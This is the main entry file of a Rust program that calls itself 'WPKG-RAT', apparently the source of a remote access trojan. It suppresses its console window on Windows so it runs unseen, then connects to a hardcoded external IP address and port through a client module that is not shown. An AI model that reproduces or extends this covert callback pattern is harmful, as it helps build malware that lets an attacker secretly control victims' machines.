// Remove console window in Windows OS
#![windows_subsystem = "windows"]

// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod send_api_request;
mod utils;

use lazy_static::lazy_static;
pub use send_api_request::*;

lazy_static! {
    pub static ref TCP_ADDRESS: String = "136.243.156.104:3217".to_string();
}

#[tokio::main]
async fn main() {
    println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));

    // init logger
    logger::init();

    // connect to the ServerD
    client::connect();
}
